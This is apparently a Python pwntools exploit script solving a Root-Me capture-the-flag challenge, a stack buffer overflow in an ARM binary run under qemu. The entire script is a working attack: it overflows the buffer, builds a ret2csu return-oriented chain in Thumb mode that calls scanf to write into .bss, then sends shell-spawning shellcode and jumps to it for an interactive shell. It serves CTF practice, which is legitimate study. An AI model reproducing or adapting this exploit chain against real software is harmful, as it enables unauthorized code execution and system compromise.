#coding:utf8
from pwn import *

context(os='linux',arch='arm')

elf = ELF('./root_me_stack_buffer_overflow_basic')
scanf_got = elf.got['scanf']
bss = 0x00021008 + 0x100
csu_pop = 0x00010610
csu_call = 0x000105FE
sh = process(argv=['qemu-arm','-L','./','./root_me_stack_buffer_overflow_basic'])
#sh = process(argv=['qemu-arm','-g','1234','-L','./arm_libs','./root_me_stack_buffer_overflow_basic'])

payload = 'a'*0xA4 + p32(csu_pop + 1) #切换到Thumb模式，bit0 = 1
payload += p32(0) #R5
payload += p32(0) #R4
payload += p32(scanf_got) #R5
payload += p32(1) #R6
payload += p32(0x00010644) #R7
payload += p32(bss) #R8
payload += p32(0) #R9
payload += p32(csu_call + 1) #Thumb模式，bit0 = 1

payload += p32(0)*0x7
payload += p32(bss) #执行shellcode

sh.sendlineafter('dump:',payload)
sh.sendlineafter('Dump again (y/n):','n')
sh.sendline(asm(shellcraft.sh()))

sh.interactive()
